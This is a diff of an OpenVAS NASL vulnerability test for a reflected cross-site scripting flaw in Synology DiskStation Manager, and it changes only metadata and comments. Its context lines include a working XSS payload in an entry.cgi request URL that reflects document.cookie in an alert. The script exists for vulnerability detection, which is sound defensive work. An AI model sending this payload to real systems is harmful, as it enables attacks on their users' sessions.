@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_synology_diskstation_xss_vuln.nasl 8114 2017-12-14 07:25:09Z santu $
+# $Id: gb_synology_diskstation_xss_vuln.nasl 11291 2018-09-07 14:48:41Z mmartin $
 #
 # Synology DiskStation Manager Cross-Site Scripting Vulnerability
 #
@@ -29,10 +29,10 @@ CPE = "cpe:/o:synology:dsm";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.805391");
-  script_version("$Revision: 8114 $");
+  script_version("$Revision: 11291 $");
   script_tag(name:"cvss_base", value:"4.3");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
-  script_tag(name:"last_modification", value:"$Date: 2017-12-14 08:25:09 +0100 (Thu, 14 Dec 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-07 16:48:41 +0200 (Fri, 07 Sep 2018) $");
   script_tag(name:"creation_date", value:"2015-05-28 13:19:38 +0530 (Thu, 28 May 2015)");
   script_tag(name:"qod", value:"50"); # Prone to false positives and doesn't match existing qod_types
   script_name("Synology DiskStation Manager Cross-Site Scripting Vulnerability");
@@ -61,8 +61,8 @@ if(description)
 
   script_tag(name:"solution_type", value:"VendorFix");
 
-  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/132050/synologydiskstation-xss.txt");
-  script_xref(name : "URL" , value : "https://www.securify.nl/advisory/SFY20150503/reflected_cross_site_scripting_in_synology_diskstation_manager.html");
+  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/132050/synologydiskstation-xss.txt");
+  script_xref(name:"URL", value:"https://www.securify.nl/advisory/SFY20150503/reflected_cross_site_scripting_in_synology_diskstation_manager.html");
 
   script_category(ACT_ATTACK);
   script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
@@ -83,22 +83,16 @@ include("http_func.inc");
 include("http_keepalive.inc");
 include("host_details.inc");
 
-## Variable Initialization
-http_port = "";
-
-## Get HTTP Port
 if(!http_port = get_app_port(cpe:CPE)){
   exit(0);
 }
 
-## Construct Attack Request
 url = '/webapi/entry.cgi?compound=%5B{"api"%3a"<img+src%3dx+onload%3dalert'
     + '(document.cookie)>"%2c"method"%3a"status"%2c"version"%3a1}%2c{"api"%3a'
     + '"SYNO.Core.System.Utilization"%2c"method"%3a"get"%2c"version"%3a1%2c"'
     + 'type"%3a"current"%2c"resource"%3a%5B"cpu"%2c"memory"%2c"network"%5D}%5D&'
     + 'api=SYNO.Entry.Request&method=request&version=1';
 
-## Try attack and check the response to confirm vulnerability
 if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
    pattern:"<img src=x onload=alert\(document.cookie\)>",
    extra_check:make_list('SYNO.Core.System.Utilization', '"has_fail":true', '"code":119')))
